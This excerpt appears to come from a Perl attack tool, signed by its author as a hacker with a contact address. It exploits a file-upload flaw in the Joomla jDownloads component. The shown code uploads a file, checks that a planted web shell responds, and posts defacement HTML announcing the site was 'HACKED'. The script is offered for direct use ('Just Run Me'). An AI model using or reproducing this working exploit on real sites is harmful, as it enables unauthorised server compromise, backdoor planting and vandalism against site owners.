...
print $mrspy;
    ...
    print color('reset');
print color("bold Green"), "Coded By V3rluchie V4 Just Run Me and See The magic\n";
print color 'reset';
print color("bold yellow"),"Contact me verluchie[at]hackermail.com \n\n";
print color 'reset';
...
my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"V3rluchie", mail=>"verluchie@hackermail.com", filetitle =>"sohaip-hackerDZ Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
 

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/V3rluchie/) {
    print color('bold green');
print "[Sucess]\n";
...
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"V3rluchie", mail=>"V3rluchie", filetitle =>"V3rluchie", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
...
$defx="                           <h2><center>V3rluchie<center></h2>
            </div>
            <div class=\"post_content\">
              <p><title>HACKED by V3rluchie
</title></p>
<div style=\"text-align: center\"><font size=\"6\" face=\"comic sans ms\"><b>Hacked By V3rluchie</b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><br /></b></font></div>
<div style=\"text-align: center\"><font size=\"5\" face=\"comic sans ms\"><b><font color=red>HACKED</font> V3rluchie<font color=red>HACKED</font> V3rluchie <font color=red>HACKED</font> V3rluchie <font color=red>HACKED</font> V3rluchie <font color=red>HACKED</font>V3rluchie <br /></b></font></div>
...
$def=  $site . 'spy.html';
$gassface = POST $ajx, ['id' => $sirina, 'title' => 'HACKED by V3rluchie', 'slug'=> $file,'content' => $defx];
